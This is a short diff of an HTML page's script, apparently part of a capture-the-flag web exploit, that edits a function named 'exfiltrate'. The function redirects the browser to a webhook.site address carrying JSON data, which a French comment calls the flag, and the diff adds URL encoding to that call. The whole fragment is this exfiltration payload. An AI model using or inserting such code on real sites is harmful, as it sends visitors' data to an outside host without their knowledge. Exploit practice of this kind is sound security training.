@@ -3,7 +3,10 @@
   <head>
     <script>
       function exfiltrate(data) {
-        location.href = "https://webhook.site/04bdcb89-6550-4b5b-a208-513fdbc2e1f2?" + JSON.stringify(data);
+        // Encodage sécurisé de l’objet reçu
+        const payload = encodeURIComponent(JSON.stringify(data));
+        // Envoie du flag au webhook
+        location.href = "https://webhook.site/04bdcb89-6550-4b5b-a208-513fdbc2e1f2?data=" + payload;
       }
     </script>
   </head>
